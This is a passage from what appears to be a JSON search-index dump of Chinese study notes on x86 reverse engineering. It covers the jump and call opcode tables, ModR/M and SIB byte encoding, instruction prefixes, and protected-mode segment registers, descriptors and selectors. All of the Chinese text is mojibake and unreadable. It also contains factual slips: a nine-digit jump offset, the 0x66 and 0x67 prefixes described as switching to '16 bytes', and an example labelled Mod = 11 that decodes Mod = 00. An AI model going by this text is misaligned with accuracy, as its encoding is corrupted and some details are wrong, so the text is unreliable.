0x78\tJS 0x79\tJNS 0x7A\tJP/JPE 0x7B\tJNP/JPO 0x7C\tJL/JNGE 0x7D\tJNL/JGE 0x7E\tJLE/JNG 0x7F\tJNLE/JG å“¦ï¼Œä¸çŸ¥è¢«è°éª—äº†äº† æ¡ä»¶è·³è½¬ï¼Œåè·Ÿå››ä¸ªå­—èŠ‚ç«‹å³æ•°çš„åç§»ï¼ˆæœ‰ç¬¦å·ï¼‰ï¼Œå…±äº”ä¸ªå­—èŠ‚ã€‚\nå¦‚æœæ¡ä»¶æˆç«‹ï¼Œè·³è½¬åˆ°ï¼šå½“å‰æŒ‡ä»¤åœ°å€ + å½“å‰æŒ‡ä»¤é•¿åº¦ + Id\næœ€å¤§å€¼ï¼šå‘å‰è·³7FFFFFFFFï¼Œå‘åè·³80000000\n0x0F 0x80 JO 0x0F 0x81\tJNO 0x0F 0x82\tJB/JNAE/JC 0x0F 0x83\tJNB/JAE/JNC 0x0F 0x84\tJZ/JE 0x0F 0x85\tJNZ/JNE 0x0F 0x86\tJBE/JNA 0x0F 0x87\tJNBE/JA 0x0F 0x88\tJS 0x0F 0x89\tJNS 0x0F 0x8A\tJP/JPE 0x0F 0x8B\tJNP/JPO 0x0F 0x8C\tJL/JNGE 0x0F 0x8D\tJNL/JGE 0x0F 0x8E\tJLE/JNG 0x0F 0x8F\tJNLE/JG å…¶ä»–æŒ‡ä»¤\n0xE0 LOOPNE/LOOPNZ Ib (Jb) 0XE1 LOOPE/LOOPZ Ib (Jb) 0XE2\tLOOP Ib (Jb) 0XE3\tJrCXZ Ib (Jb) (åœ¨32ä½æ¨¡å¼ä¸­,RCXä¸ºECX) 0xE8\tCALL Id (Jd) 0xE9\tJMP Id (Jd) 0xEA\tJMP Ap ï¼ˆApï¼šå…­å­—èŠ‚é•¿åº¦çš„ç›´æ¥åœ°å€ï¼‰ï¼ˆJmp farï¼‰ 0xEB\tJMP Ib (Jb)ï¼ˆJmp shortï¼‰ 0xC3 RET 0xC2\tRET Iw 0XCB\tRETF ï¼ˆreturn farï¼‰ 0xCA\tRETF Iw ç»å…¸å˜é•¿æŒ‡ä»¤ï¼ˆ_ModR/Mï¼‰ å…ˆç ”ç©¶ä¸€ä¸‹çš„æŒ‡ä»¤æ ¼å¼ï¼š\n0x88 MOV Eb, Gb\tGï¼šé€šç”¨å¯„å­˜å™¨ 0x89\tMOV Ev, Gv\tEï¼šå¯„å­˜å™¨/å†…å­˜ 0x8A\tMOV Gb, Eb\tbï¼šå­—èŠ‚ 0x8B\tMOV Gv, Ev\tvï¼šWord, doubleword or quadword å½“æŒ‡ä»¤ä¸­å‡ºç°å†…å­˜æ“ä½œå¯¹è±¡çš„æ—¶å€™ï¼Œå°±éœ€è¦åœ¨æ“ä½œç åé¢é™„åŠ ä¸€ä¸ªå­—èŠ‚æ¥è¿›è¡Œè¡¥å……è¯´æ˜ï¼Œè¿™ä¸ªå­—èŠ‚è¢«ç§°ä¸ºModR/Mã€‚\nè¯¥å­—èŠ‚çš„8ä¸ªä½è¢«åˆ†æˆäº†ä¸‰éƒ¨åˆ†ï¼š\n7 6 5 3 2 0 __________________________________ | Mod | Reg/Opcode | R/M | |_________|_______________|______| å…¶ä¸­ï¼ŒReg/Opcodeï¼ˆç¬¬3ã€4ã€5ä½ï¼Œå…±3ä¸ªå­—èŠ‚ï¼‰æè¿°æŒ‡ä»¤ä¸­çš„Géƒ¨åˆ†ï¼Œå³å¯„å­˜å™¨ã€‚\nå¯„å­˜å™¨å®½åº¦ 000 001 010 011 100 101 110 111 32 EAX ECX EDX EBX ESP EBP ESI EDI 8 AL CL DL BL AH CH DH BH Modï¼ˆç¬¬6ã€7ä½ï¼‰å’ŒR/Mï¼ˆç¬¬0ã€1ã€2ä½ï¼‰å…±åŒæè¿°æŒ‡ä»¤ä¸­çš„Eéƒ¨åˆ†ï¼Œå³å¯„å­˜å™¨/å†…å­˜ã€‚\nå®ä¾‹ï¼š\nå½“Mod = 11æ—¶ï¼ŒModR/Må­—èŠ‚ç›´æ¥æ“ä½œä¸¤ä¸ªå¯„å­˜å™¨ï¼š\næ¯”å¦‚æ¥æ‹†ä¸€ä¸ªï¼š0x88 0x10\né¦–å…ˆç¡®å®šæ˜¯MOV Eb, Gbæ ¼å¼ å…¶æ¬¡0x10 = 0001 0000 = 00 010 000 æŸ¥è¡¨Mod = 00 R/M = 000æ ¼å¼ä¸ºMOV [EAX], Gb å› ä¸ºReg/Opcode = 010æ ¼å¼ä¸ºMOV [EAX], dl æ€»ç»“ï¼š\nESPæŒ‡å‘æ ˆé¡¶ï¼Œæ˜¯æµ®åŠ¨çš„ï¼Œä¸ç¡®å®šçš„ï¼Œè‹±ç‰¹å°”å°†è¿™ä¸ªç¼–ç åºŸå¼ƒï¼Œç”±å¦å¤–çš„æ ¼å¼æ¥è¯´æ˜ã€‚ EBPæŒ‡å‘æ ˆåº•ï¼Œè€Œ[EBP]é€šå¸¸å­˜å‚¨ä¸Šä¸€ä¸ªEBPï¼Œæ‰€ä»¥[EBP]æ— æ•°æ®æ“ä½œæ„ä¹‰ï¼Œè‹±ç‰¹å°”å°†è¿™ä¸ªç¼–ç åºŸå¼ƒï¼Œæ”¹ä¸ºç«‹å³æ•°å¯»å€ã€‚ å…¶å®è¿™æ¬¡çš„æŒ‡ä»¤çš„æºæ“ä½œæ•°ä¸ç›®æ ‡æ“ä½œæ•°éƒ½æ˜¯ä¸€ä¸ªEï¼Œä¸€ä¸ªGã€‚Reg/Opcodeæ˜¯ç¡®å®šGçš„ï¼ŒModä¸R/Mæ˜¯ç¡®å®šEçš„ã€‚å†çœ‹å®ƒçš„æŒ‡ä»¤æ˜¯bï¼ˆå­—èŠ‚ï¼‰è¿˜æ˜¯vï¼ˆWordï¼‰ï¼ˆè¿™ä¸€æ­¥æ˜¯ç”±æœºå™¨ç ç¡®å®šçš„0x88å°±æ˜¯8ä½çš„ï¼‰ã€‚ä¹‹åå†çœ‹Modéƒ¨åˆ†æ¥ç¡®å®šEæ˜¯å¯„å­˜å™¨è¿˜æ˜¯å†…å­˜ã€‚ ç»å…¸å˜é•¿æŒ‡ä»¤ï¼ˆ_SIBå­—æ®µï¼‰ ModR/Må­—æ®µæ˜¯ç”¨æ¥è¿›è¡Œå†…å­˜å¯»å€çš„ï¼Œå¯å½“åœ°å€å½¢å¦‚DS:[EAX + ECX*2 + 12345678]æ—¶ï¼Œä»…ä»…é ModR/Må­—æ®µï¼Œæ˜¯æè¿°ä¸å‡ºæ¥çš„ã€‚è¿™æ—¶å°±åœ¨ModR/Måé¢å¢åŠ ä¸€ä¸ªSIBå­—èŠ‚ï¼Œä¸ModR/Må­—æ®µå…±åŒæè¿°ã€‚\nåœ¨ModR/Må­—èŠ‚åï¼Œè¿˜ç´§è·Ÿç€ä¸€ä¸ªSIBå­—èŠ‚ã€‚SIBå­—èŠ‚çš„8ä¸ªä½è¢«åˆ†æˆäº†ä¸‰éƒ¨åˆ†ï¼š\n7 6 5 3 2 0 ________________________________ | Scale | Index | Base | |___________|__________|_______| åœ¨ä¾‹å­DS:[EAX + ECX*2 + 12345678]ä¸­ï¼ŒScaleæè¿°2^1ï¼ŒIndexæè¿°ECXï¼ŒBaseæè¿°EAXï¼Œè€Œ12345678ç”±ModR/Må­—æ®µå†³å®šã€‚æ‰€ä»¥SIBå­—æ®µæè¿°çš„æ–¹å¼ä¸ºï¼šBase + Index*2Scale (Scaleæè¿°2Scaleï¼Œæ‰€ä»¥åªèƒ½ä¸º *1 *2 *4 *8)\nå®ä¾‹ï¼š\nè¿™ä¸ª[*]åœ¨ç‰¹å®šæƒ…å†µä¸‹ä¼šå˜åŒ–ï¼Œåœ¨ä¸Šé¢è¿™ä¸ªä¾‹å­ä¸­æ˜¯ä¸€ä¸ª32ä½çš„åç§»ã€‚å…¶ä»–çš„æƒ…å†µï¼š\nå¦‚æœMODä¸º00ï¼Œåˆ™[*]å‘½åæ³•è¡¨ç¤ºdisp32æ²¡æœ‰åŸºæ•°ã€‚å¦åˆ™ï¼Œ[*]è¡¨ç¤ºdisp8æˆ–disp32+[EBP]ã€‚è¿™æä¾›äº†ä»¥ä¸‹åœ°å€æ¨¡å¼ï¼š MODä½æœ‰æ•ˆåœ°å€\n00ï¼š[scaled index] + disp32 01ï¼š[scaled index] + disp8 + [EBP] 10ï¼š[scaled index] + disp32 + [EBP]\nç»å…¸å˜é•¿æŒ‡ä»¤ï¼ˆ_Reg/Opcodeï¼‰ ä¹‹å‰çš„Modä¸R/Mä¹‹é—´çš„Reg/Opcodeéƒ½æ˜¯å½“ä½œå¯„å­˜å™¨æ¥åˆ†æçš„ï¼Œä½†æ˜¯å®ƒè¿˜å¯ä»¥æ ‡è¯†Opcode\nå®ä¾‹ï¼š\nå¤§æ¦‚å°±æ˜¯è¿™æ ·æ‰¾çš„äº†\næŒ‡ä»¤å‰ç¼€ æ®µå¯„å­˜å™¨ï¼ˆåé¢ä¼šå¾ˆé‡è¦ï¼‰\næ®µå¯„å­˜å™¨çš„ä½œç”¨ï¼šæ—©æœŸ8086cpuå¯»å€èŒƒå›´å°ï¼Œè‹±ç‰¹å°”éé€šè¿‡æ®µå¯„å­˜å™¨æ¥æ‹“å±•å†…å­˜ï¼Œå³é€šè¿‡æ®µå¯„å­˜å™¨åŸºå€+åç§»çš„æ–¹å¼æ¥å¯»å€ã€‚\n[]ä¸­çš„åœ°å€ä¸ºæœ‰æ•ˆåœ°å€ï¼ˆEffect Addressï¼‰ï¼Œæœ‰æ•ˆåœ°å€+æ®µå¯„å­˜å™¨åŸºå€æ‰æ˜¯å®é™…åœ°å€LAï¼ˆçº¿æ€§åœ°å€Line Addressï¼‰ã€‚\næ®µå¯„å­˜å™¨æœ¬èº«å¹¶ä¸æ˜¯å­˜å‚¨æ•°æ®çš„ï¼Œå®ƒé‡Œé¢å­˜å‚¨çš„æ˜¯ä¸€ä¸ªåœ°å€ã€‚ è¿™ä¸ªåœ°å€æŒ‡å‘äº†å†…å­˜ä¸­æŸä¸ªæ®µçš„ èµ·å§‹ä½ç½®ã€‚ï¼ˆå¾®æœºåŸç†æœ‰è®²è¿‡ï¼‰\nçº¿æ€§åœ°å€ = æ®µåŸºå€ + æœ‰æ•ˆåœ°å€\nåœ¨åæ¥çš„80386æ—¶ï¼Œcpuçš„å¯»å€èŒƒå›´å¤§å¤§æå‡ï¼Œè¿™äº›æ®µå¯„å­˜å™¨ä¾¿è¢«ç”¨ä½œäº†å…¶ä»–ç”¨é€”ã€‚ä½†æ˜¯DS:[]ç±»ä¼¼è¿™ç§å¯»å€æ ¼å¼å´è¢«ä¿ç•™äº†ä¸‹æ¥ã€‚\nå®é™…ä¸Šæ“ä½œç å·²ç»å†³å®šäº†å¯»å€æ—¶ä½¿ç”¨å“ªä¸ªæ®µå¯„å­˜å™¨ä½œä¸ºåŸºå€ï¼Œä¸éœ€è¦å…¶ä»–å­—èŠ‚æè¿°ã€‚è§„åˆ™å¦‚ä¸‹ï¼š\nå¦‚æœæ²¡æœ‰ç‰¹åˆ«è¯´æ˜ï¼Œ[]å‰ä¸ºDSï¼Œå³DS:[] PUSH POPæŒ‡ä»¤ï¼Œä»¥åŠåœ¨[]ä¸­ä½¿ç”¨ESP/EBPçš„ï¼Œä½¿ç”¨SSæ®µ åœ¨[Base + Index*2Scale + I]ä¸­ï¼Œä»¥Baseä¸ºåˆ¤æ–­æ¡ä»¶ï¼Œæ²¡æœ‰ç‰¹åˆ«è¯´æ˜ï¼Œç”¨DSã€‚å¦‚æœBaseä¸ºESP/EBPï¼Œåˆ™ç”¨SSæ®µ ä¸²æ“ä½œæŒ‡ä»¤ä¸€èˆ¬ä½¿ç”¨ESã€‚MOV ES:[EDI] DS:[ESI]ä¸­ï¼Œç›®æ ‡EDIä½¿ç”¨ESæ®µï¼Œå…¶ä»–ä½¿ç”¨DSæ®µ EIPæŒ‡å‘å½“å‰æŒ‡ä»¤ï¼ŒEIPå–æŒ‡ä»¤æ—¶ä½¿ç”¨çš„æ˜¯CSæ®µ å¦‚æœæŒ‡ä»¤åŠ æ®µå¯„å­˜å™¨å‰ç¼€ï¼Œåˆ™è¯¥æ¡æŒ‡ä»¤ä¸€å¾‹ç”¨è¿™ä¸ªæ®µï¼Œå¦‚æœåŠ å¤šä¸ªæ®µå¯„å­˜å™¨å‰ç¼€ï¼Œé»˜è®¤åªçœ‹opå‰çš„é‚£ä¸ª æ“ä½œæŒ‡ä»¤å‰ç¼€\n0x66ï¼šå°†æ“ä½œæ•°æ”¹ä¸º16å­—èŠ‚ã€‚\n50\tPUSH EAX 66:50\tPUSH AX 0x67ï¼šå°†æ“ä½œæ•°æ”¹ä¸º16å­—èŠ‚ã€‚ï¼ˆä¿®æ”¹é»˜è®¤å¯»å€æ–¹å¼ï¼‰\n8801 MOV BYTE PTR DS:[ECX],AL 67:8801 MOV BYTE PTR DS:[BX+DI],AL æ€»ç»“ æ“ä½œç å†³å®šåé¢æœ‰æ²¡æœ‰ModR/Må­—æ®µå’Œç«‹å³æ•°\nModR/Må†³å®šåé¢æœ‰æ²¡æœ‰SIBå­—èŠ‚å’Œåç§»\næ“ä½œæŒ‡ä»¤ä¸­åªè¦åŒ…å«Ev/Ebï¼Œåˆ™æŒ‡ä»¤ä¸­ä¸€å®šæœ‰ModR/Må­—èŠ‚\nåªéœ€è¦æŠŠæ“ä½œç ç¡®å®šä¸‹æ¥ï¼Œé‚£ä¹ˆåé¢æœ‰ä»€ä¹ˆå­—æ®µï¼Œå°±éƒ½èƒ½ç¡®å®šäº†ã€‚å³ä¸€åˆ‡ç”±æ“ä½œç å†³å®šã€‚\næ“ä½œç é•¿åº¦ï¼š\nä¸€ä¸ªå­—èŠ‚ï¼š00 - FFï¼ˆTableA-2 0Fé™¤å¤–ï¼‰\nä¸¤ä¸ªå­—èŠ‚ï¼š0F 00 - 0F FFï¼ˆTableA-3ï¼‰\nä¸‰ä¸ªå­—èŠ‚ï¼š0F 38 / 0F 3A ï¼ˆTableA-3 TableA-4 TableA-5ï¼‰"},"title":"Windows BEG"},"/docs/windows/windows-ext/":{"data":{"":"","#":"ä¿æŠ¤æ¨¡å¼ ä¿æŠ¤æ¨¡å¼æ¦‚è¿° â€ä¿æŠ¤æ¨¡å¼åˆ†ä¸ºæ®µæœºåˆ¶å’Œé¡µæœºåˆ¶ã€‚\nç†è§£ï¼šæƒ³è±¡ä¸€ä¸‹ä½ å®¶çš„ç”µè„‘å°±åƒä¸€ä¸ªå¤§å¨æˆ¿ï¼Œé‡Œé¢æœ‰å¾ˆå¤šå°å¸®æ‰‹åœ¨åšä¸åŒçš„äº‹æƒ…ï¼Œæ¯”å¦‚ç…®æ±¤ã€ç‚’èœç­‰ç­‰ã€‚ä¿æŠ¤æ¨¡å¼å°±æ˜¯ä¸ºäº†ä¿è¯è¿™ä¸ªå¤§å¨æˆ¿çš„ç§©åºå’Œå®‰å…¨ã€‚é¦–å…ˆï¼Œä¿æŠ¤æ¨¡å¼å°±åƒæ˜¯ç»™æ¯ä¸ªå°å¸®æ‰‹é…äº†ä¸€å¥—ä¸“å±çš„å·¥å…·ï¼Œä»–ä»¬ä¸èƒ½éšä¾¿ç”¨åˆ«äººçš„å·¥å…·ï¼Œä¹Ÿä¸èƒ½ä¹±ç¢°åˆ«äººçš„é£Ÿæã€‚è¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼Œå³ä½¿å…¶ä¸­ä¸€ä¸ªå°å¸®æ‰‹çŠ¯é”™äº†ï¼Œä¹Ÿä¸ä¼šå½±å“åˆ°å…¶ä»–å°å¸®æ‰‹(é˜²æ­¢ä¸€ä¸ªè¿›ç¨‹è®¿é—®æˆ–ä¿®æ”¹å¦ä¸€ä¸ªè¿›ç¨‹çš„å†…å­˜æ•°æ®)ã€‚å…¶æ¬¡ï¼Œä¿æŠ¤æ¨¡å¼ç»™äº†æ¯ä¸ªå°å¸®æ‰‹ä¸€ä¸ªèº«ä»½è¯ï¼Œåˆ†æˆä¸¤ç±»ï¼šä¸€ç±»æ˜¯é«˜çº§å¨å¸ˆï¼Œä¸€ç±»æ˜¯æ™®é€šå¨å¸ˆã€‚é«˜çº§å¨å¸ˆæœ‰æ›´å¤šçš„æƒé™ï¼Œå¯ä»¥åšæ›´å¤šçš„äº‹æƒ…ï¼Œæ¯”å¦‚çƒ§å¼€æ°´ç­‰ã€‚è€Œæ™®é€šå¨å¸ˆçš„æƒé™å°±å°‘ä¸€äº›ï¼Œä¸èƒ½åšä¸€äº›å±é™©çš„äº‹æƒ…ã€‚è¿™æ ·å¯ä»¥é˜²æ­¢æœ‰äººä¹±æ¥ï¼Œæ¯”å¦‚ä¸€ä¸ªä¸æ‡‚è§„çŸ©çš„å°å¸®æ‰‹æƒ³çƒ§å¼€æ°´ï¼Œä½†æ˜¯ä»–åªæ˜¯ä¸ªæ™®é€šå¨å¸ˆï¼Œå°±ä¸èƒ½æ‰§è¡Œè¿™ä¸ªæ“ä½œ(å†…æ ¸æ¨¡å¼å…·æœ‰æ›´é«˜çš„ç‰¹æƒçº§åˆ«ï¼Œå¯ä»¥æ‰§è¡Œæ›´å¤šçš„æ“ä½œï¼Œè€Œç”¨æˆ·æ¨¡å¼å—åˆ°æ›´å¤šçš„é™åˆ¶)ã€‚å†æ¥ï¼Œä¿æŠ¤æ¨¡å¼è¿˜ç»™äº†æ¯ä¸ªå°å¸®æ‰‹ä¸€ä¸ªæ¢¦å¹»å¨æˆ¿ï¼Œè™½ç„¶å®é™…ä¸Šåªæœ‰ä¸€ä¸ªå¤§å¨æˆ¿ï¼Œä½†æ˜¯æ¯ä¸ªå°å¸®æ‰‹éƒ½è§‰å¾—è‡ªå·±æœ‰ä¸€ä¸ªå±äºè‡ªå·±çš„æ¢¦å¹»å¨æˆ¿ã€‚è¿™æ ·å°±ä¸ä¼šå‡ºç°äº‰æŠ¢å¨æˆ¿çš„æƒ…å†µï¼Œå¤§å®¶éƒ½å¯ä»¥å®‰å¿ƒåšè‡ªå·±çš„äº‹æƒ…(æ“ä½œç³»ç»Ÿå¯ä»¥ä¸ºæ¯ä¸ªè¿›ç¨‹æä¾›è™šæ‹Ÿå†…å­˜ï¼Œä½¿å¾—æ¯ä¸ªè¿›ç¨‹éƒ½è®¤ä¸ºè‡ªå·±æ‹¥æœ‰è¿ç»­çš„å†…å­˜ç©ºé—´)ã€‚æœ€åï¼Œä¿æŠ¤æ¨¡å¼è¿˜è®©è¿™äº›å°å¸®æ‰‹è½®æµå·¥ä½œï¼Œæ¯ä¸ªäººéƒ½æœ‰è‡ªå·±çš„æ—¶é—´æ®µåšäº‹æƒ…ï¼Œä¸ä¼šå‡ºç°ä¸€ä¸ªäººéœ¸å å¨æˆ¿ä¸è‚¯ç»™åˆ«äººæœºä¼šçš„æƒ…å†µï¼Œè¿™æ ·å¤§å®¶éƒ½æœ‰æœºä¼šå·¥ä½œï¼Œæ•ˆç‡ä¹Ÿæ›´é«˜(æ“ä½œç³»ç»Ÿå¯ä»¥åŒæ—¶è¿è¡Œå¤šä¸ªè¿›ç¨‹ï¼Œå¹¶å®ç°è¿›ç¨‹ä¹‹é—´çš„æ—¶é—´ç‰‡è½®è½¬è°ƒåº¦ï¼Œä½¿å¾—å¤šä¸ªç¨‹åºå¯ä»¥å¹¶å‘æ‰§è¡Œ)ã€‚\næ®µå¯„å­˜å™¨ç»“æ„ æ®µå¯„å­˜å™¨ä¸€å…±æœ‰CS SS DS ES FS GS LDTR TR å…±8ä¸ªã€‚\nå½“æˆ‘ä»¬ç”¨æ±‡ç¼–è¯»å†™æŸä¸€ä¸ªåœ°å€æ—¶ï¼š\nmov dword ptr ds:[0x123456],eax æˆ‘ä»¬çœŸæ­£è¯»å†™çš„åœ°å€æ˜¯ï¼š\nds.base+0x123456 æ®µå¯„å­˜å™¨ç»“æ„ä½“å¦‚ä¸‹ï¼š\nstruct Segment { WORD Selecter; //16ä½æ®µé€‰æ‹©å­ å¯è§éƒ¨åˆ†. ä½¿ç”¨OD æˆ–è€…X64dbgçœ‹æ®µå¯„å­˜å™¨åªä¼šæ˜¾ç¤º16ä½çš„æ®µé€‰æ‹©å­å¯è§éƒ¨åˆ†. WORD Attribute; //16ä½è¡¨ç¤ºçš„æ®µå±æ€§, è¡¨ç¤ºäº†å½“å‰æ®µå¯„å­˜å™¨æ˜¯å¯è¯»çš„å¯å†™çš„è¿˜æ˜¯å¯æ‰§è¡Œçš„ DWORD Base; //32ä½è¡¨ç¤ºçš„åŸºå€,è¡¨ç¤ºæ®µä»å“ªé‡Œå¼€å§‹ DWORD limit; //32ä½è¡¨ç¤º,è¡¨ç¤ºçš„æ˜¯åŸºå€çš„é•¿åº¦. base + limit å¯ä»¥ç¡®å®šä¸€ä¸ªæ®µçš„å¤§å° } ç»“æ„å¦‚ä¸‹å›¾ï¼š\n[---------------------------------\u003e å¯è§éƒ¨åˆ† \u003c-----------------------------------------] [--\u003eä¸å¯è§éƒ¨åˆ†\u003c---] +--------------------------------------------------------------------------------------------------------+ |\t|\t|\t|\t| |\t|\t|\t|\t| |\t|\t|\t|\t| |\t|\t|\t|\t| +--------------------------------------------------------------------------------------------------------+ ^\t^\t^\t^ |\t|\t|\t| |\t|\t|\t| 32ä½Base\t32ä½limit\t16ä½Attribute\t16ä½Selecter æ®µå¯„å­˜å™¨å±æ€§å¦‚ä¸‹ï¼š\nå¯„å­˜å™¨åç§° æ®µé€‰æ‹©å­(Select) æ®µå±æ€§(Attributes) æ®µåŸºå€(Base) æ®µé•¿(Limit) ES(é™„åŠ æ‰©å±•æ®µ) 0x0023 å¯è¯»,å¯å†™ 0x0000000 0xFFFFFFFF CS(ä»£ç æ®µ) 0x001B å¯è¯»,å¯æ‰§è¡Œ 0x00000000 0xFFFFFFFF SS(å †æ ˆæ®µ) 0x0023 å¯è¯»,å¯å†™ 0x00000000 0xFFFFFFFF DS(æ•°æ®æ®µ) 0x0023 å¯è¯»,å¯å†™ 0x00000000 0xFFFFFFFF FS(åˆ†æ®µæœºåˆ¶) 0x003B å¯è¯»,å¯å†™ 0x7FFDF000 0xFFF GS(é¢ï¼Œ64ä½ç³»ç»Ÿå¥½åƒä½¿ç”¨å§) æœªä½¿ç”¨ æœªä½¿ç”¨ æœªä½¿ç”¨ æœªä½¿ç”¨ æ®µæè¿°ç¬¦ä¸æ®µé€‰æ‹©å­ GDT(å…¨å±€æè¿°ç¬¦è¡¨) LDT(å±€éƒ¨æè¿°ç¬¦è¡¨)\nå½“æˆ‘ä»¬æ‰§è¡Œç±»ä¼¼MOV DS,AXæŒ‡ä»¤æ—¶ï¼ŒCPUä¼šæŸ¥è¡¨ï¼Œæ ¹æ®AXçš„å€¼æ¥å†³å®šæŸ¥æ‰¾GDTè¿˜æ˜¯LDTï¼ŒæŸ¥æ‰¾è¡¨çš„ä»€ä¹ˆä½ç½®ï¼ŒæŸ¥å‡ºå¤šå°‘æ•°æ®ã€‚(AXå°±æ˜¯å¯è§çš„Selectoræ®µé€‰æ‹©å­çš„å†…å®¹)\nGDTR(48ä½å¯„å­˜å™¨ï¼Œè¡¨ä¸­å­˜æ”¾äº†GDTè¡¨ çš„èµ·å§‹åœ°å€(32ä½)ï¼Œå¤–åŠ å­˜æ”¾GDTè¡¨çš„å¤§å°(16ä½))\næ®µæè¿°ç¬¦(8å­—èŠ‚ä¸€ç»„ï¼Œ64ä½)ç»“æ„ï¼ˆè®°ä½ç»“æ„ï¼‰\nAVL: è¯¥ä½æ˜¯ç”¨æˆ·ä½ï¼Œå¯ä»¥è¢«ç”¨æˆ·è‡ªç”±ä½¿ç”¨ BASE: æ®µåŸºå€ï¼Œç”±ä¸Šå›¾ä¸­çš„ä¸¤éƒ¨åˆ†(BASE 31-24 å’Œ BASE 23-0(å›¾é”™äº†))ç»„æˆ D/B: è¯¥ä½ä¸º 0 è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ª 16 ä½çš„æ®µï¼Œ1 è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ª 32 ä½æ®µ DPLï¼šæ®µæƒé™ Gï¼šLIMITçš„å•ä½ï¼Œè¯¥ä½ 0 è¡¨ç¤ºå•ä½æ˜¯å­—èŠ‚(0xfffff)ï¼Œ1è¡¨ç¤ºå•ä½æ˜¯ 4KB(0xffffffff) LIMIT: æ®µçš„ç•Œé™ï¼Œå•ä½ç”± G ä½å†³å®šã€‚æ•°å€¼ä¸Šï¼ˆç»è¿‡å•ä½æ¢ç®—åçš„å€¼ï¼‰ç­‰äºæ®µçš„é•¿åº¦ï¼ˆå­—èŠ‚ï¼‰- 1ã€‚ P: æ®µå­˜åœ¨ä½ï¼Œè¯¥ä½ä¸º 0 è¡¨ç¤ºè¯¥æ®µä¸å­˜åœ¨ï¼Œä¸º 1 è¡¨ç¤ºå­˜åœ¨ã€‚ S: è¯¥ä½ä¸º 1 è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªæ•°æ®æ®µæˆ–è€…ä»£ç æ®µã€‚ä¸º 0 è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªç³»ç»Ÿæ®µï¼ˆæ¯”å¦‚è°ƒç”¨é—¨ï¼Œä¸­æ–­é—¨ç­‰ï¼‰ TYPE: æ ¹æ® S ä½çš„ç»“æœï¼Œå†æ¬¡å¯¹æ®µç±»å‹è¿›è¡Œç»†åˆ†ã€‚ æ®µé€‰æ‹©å­ï¼ˆ2å­—èŠ‚ï¼Œ16ä½ï¼‰\næ®µé€‰æ‹©å­æ˜¯ä¸€ä¸ª16ä½çš„æ®µæè¿°ç¬¦ï¼Œè¯¥æè¿°ç¬¦æŒ‡å‘äº†å®šä¹‰è¯¥æ®µçš„æ®µæè¿°ç¬¦ã€‚\nè¯´æ˜ï¼š MOV DSï¼ŒAXæŒ‡ä»¤æ—¶ï¼Œ å‡å¦‚AX=1Bï¼Œå³001Bï¼Œæ‹†åˆ†ä¸º0000 0000 0001 1011\nå»æ‰TIå’ŒRPLå€¼ï¼Œåå‰©ä¸‹Indexå€¼ä¸º11ï¼Œå³3ï¼Œåˆ™æŸ¥GDTè¡¨ç´¢å¼•å€¼ä¸º3 ï¼ˆGDTè¡¨ä¸­ç´¢å¼•å€¼ä»0å¼€å§‹ï¼Œç´¢å¼•å€¼ä¸º0å¤„çš„æ®µæè¿°ç¬¦ä¸º0ï¼‰çš„æ®µæè¿°ç¬¦ã€‚\nåŠ è½½æ®µæè¿°ç¬¦è‡³æ®µå¯„å­˜å™¨\né™¤äº†MOVæŒ‡ä»¤,æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨LESã€LSSã€LDSã€LFSã€ LGSæŒ‡ä»¤ä¿®æ”¹å¯„å­˜å™¨ã€‚(Læ˜¯Loadçš„æ„æ€)\nCSä¸èƒ½é€šè¿‡ä¸Šè¿°çš„æŒ‡ä»¤è¿›è¡Œä¿®æ”¹ï¼ŒCSä¸ºä»£ç æ®µï¼ŒCSçš„æ”¹å˜ä¼šå¯¼è‡´EIPçš„æ”¹å˜ï¼Œè¦æ”¹CSï¼Œå¿…é¡»è¦ä¿è¯CSä¸EIPä¸€èµ·æ”¹ã€‚\nchar buffer[6]; asm{ les ecx,fword ptr ds:[buffer] //é«˜2ä¸ªå­—èŠ‚ç»™es,ä½å››ä¸ªå­—èŠ‚ç»™ecx } //esä¹Ÿå°±æ˜¯ä¸Šé¢çš„æ®µé€‰æ‹©å­ï¼Œç”¨00è¡¥å…¨æˆ4ä½ï¼Œç„¶åæ‹†åˆ†â€¦â€¦ æ³¨æ„: RPL\u003c=DPL(åœ¨æ•°å€¼ä¸Š)\t(ä»¥ä»€ä¹ˆæ ·çš„æƒé™å»è®¿é—®æ®µ)\næ®µæè¿°ç¬¦çš„å±æ€§ P: æ®µå­˜åœ¨ä½ï¼Œè¯¥ä½ä¸º 0 è¡¨ç¤ºè¯¥æ®µä¸å­˜åœ¨ï¼Œä¸º 1 è¡¨ç¤ºå­˜åœ¨ã€‚(CPUåé¢å°±ä¸æ£€æŸ¥åˆ«çš„ä½äº†)\nLIMIT: æ®µçš„ç•Œé™ï¼Œå•ä½ç”± G ä½å†³å®šã€‚æ•°å€¼ä¸Šï¼ˆç»è¿‡å•ä½æ¢ç®—åçš„å€¼ï¼‰ç­‰äºæ®µçš„é•¿åº¦ï¼ˆå­—èŠ‚ï¼‰- 1ã€‚\nAttribute //16ä½ å¯¹åº”æ®µæè¿°ç¬¦ï¼ˆé«˜å››å­—èŠ‚ï¼‰ ç¬¬8ä½~ç¬¬23ä½\nBase //32ä½ ï¼ˆé«˜å››å­—èŠ‚ï¼‰ç¬¬24ä½ ~ ç¬¬31ä½ + ï¼ˆé«˜å››å­—èŠ‚ï¼‰ç¬¬0ä½ ~ ç¬¬7ä½+ï¼ˆä½å››å­—èŠ‚ï¼‰ç¬¬16ä½ ~ ç¬¬31ä½\nLimit //32ä½ ï¼ˆé«˜å››å­—èŠ‚ï¼‰ç¬¬16ä½ ~ ç¬¬19ä½ +ï¼ˆä½å››å­—èŠ‚ï¼‰ç¬¬0ä½ ~ ç¬¬15ä½ æ€»å…±20ä½ æœ€å¤§å€¼ä¹Ÿå°±æ˜¯FFFFFï¼Œæ­¤æ—¶åˆ†æƒ…å†µ 1.å¦‚æœGä½ä¸º0ï¼Œé‚£ä¹ˆLimitå•ä½æ˜¯å­—èŠ‚ï¼Œæ­¤æ—¶é«˜ä½å¡«0,å³æœ€å¤§å€¼ä¹Ÿå°±æ˜¯0x000fffff 